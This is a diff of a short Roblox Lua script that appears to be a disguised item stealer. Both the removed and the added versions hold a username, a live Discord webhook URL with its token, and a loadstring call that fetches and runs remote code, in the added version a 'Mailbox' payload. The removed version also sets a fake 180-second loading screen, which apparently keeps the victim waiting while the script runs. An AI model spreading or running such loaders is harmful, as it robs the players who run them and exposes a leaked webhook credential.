@@ -1,25 +1,4 @@
- 
-
-UserName = "sangpro232"
-
-UserName2 = "sangpro232"
-
-Webhook = "https://discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
-
- _G.LoadingScreen = true
-
-_G.AntiLeave = false
-
-_G.MouseLock = true  
-
-_G.ScriptName = "Project-Wd Scriptz"
-
-_G.FirstText = "Script Preparing"
-
-_G.SecondText = "Script Loading..."
-
-_G.ThirdText = "Almost Done..."
-
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+_G.Username = "Sangpro232" 
+_G.Diamonds = 500000
+_G.Webhook = "https://discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
